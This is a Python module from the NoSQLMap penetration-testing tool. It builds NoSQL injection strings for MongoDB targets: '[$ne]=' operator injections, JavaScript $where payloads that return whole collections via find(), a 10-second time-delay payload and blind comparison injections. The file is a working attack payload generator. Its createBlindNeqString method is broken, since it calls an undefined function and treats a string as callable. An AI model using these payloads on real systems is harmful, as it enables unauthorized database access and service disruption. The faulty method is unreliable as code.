#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import string
import itertools
import random

def randInjString(size, formatString):
    """
    supporting function, return a random string of size size and using characters from formatString decision.
    Possible formats:
    1: letters+digits
    2: letters
    3: digits
    4: a mail-alike string ([a-zA-Z0-9]+@[a-zA-Z0-9]+.com)

    """
    if formatString == 1:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 2:
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 3:
        chars = string.digits
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 4:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'

class InjectionStringCreator:
    """
    Class for creating an injection string.
    every method returns a string ready for injection
    Basic blocks provided:
        - leftPart: a character or a number + ";"
        - rightPart: a character or a number

    In addition, a list of formats and sizes.
    createIdString is a generator for returning a random size string of a cerain format. The string is expected to be modified by
    a custom function in order to transform it to an actual injection (i.e., adding a left and right part)
    """

    leftPart = [
        "a\';",
        "a\";",
        "1;"
        ]    

    rightPart = [
        "var d=\"a",
        "var d=\'a",
        "var d=1"
        ]

    formatAvailables = [1,2,3,4]

    standardSizes = [5,12,19,26,31]

    def __init__(self,size=standardSizes, formats=formatAvailables):
        """
        If provided, set size to a list of user-decided sizes, and formats too.
        Otherwise, sizes and formats will be the standard ones (as defined as class elements)
        """

        self.sizes = size
        self.formats = formats

    def createIdString(self):
        """
        a generator for creating a string.
        Creates a string for each size and format available (standard or custom)
        """

        for st in itertools.product(self.sizes, self.formats):
            yield "%s" %(randInjString(st[0], st[1]))

    def makeNeqString(self, origString):
        """
        Prepend the string with a "[$ne]=" attribute
        """
        return "%s%s" % ("[$ne]=", origString)

    def makeWhereString(self, injString):
        """
        generator for creating a WhereString, in the form

        leftPart+informations+rightPart

        informations is a string where a random string is used as a collection to be returned
        """

        informations = [
            "return db.%s.find();",
            "return db.%s.findOne();",
        ]

        for st in itertools.product(self.leftPart, informations, self.rightPart):
            central = st[1] % (injString)
            yield "%s%s%s" % (st[0],central,st[2])

    def createTimeString(self):
        """
        Creates a time injection string.
        Right now, no random strings are needed
        """

        informations = [
            'var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return;'
                ]
        for st in itertools.product(self.leftPart, informations, self.rightPart):
            yield "%s%s%s" % (st[0], st[1], st[2])

    def createBlindNeqString(self, injString):
        """
        Crates a blind injection string.
        Use a random string and compare it as an element in collection with a rightPart element

        """
        
        informations = [
            "return this.%s!='",
            "return this.%s!=\"",
        ]
        randCentral = rand(injString(5,2))
        for st in itertools.product(self.leftPart, informations, self.rightPart):
            central = st[1] % (randCentral)
            yield "%s%s%s%s" % (st[0], central, injString, st[2])
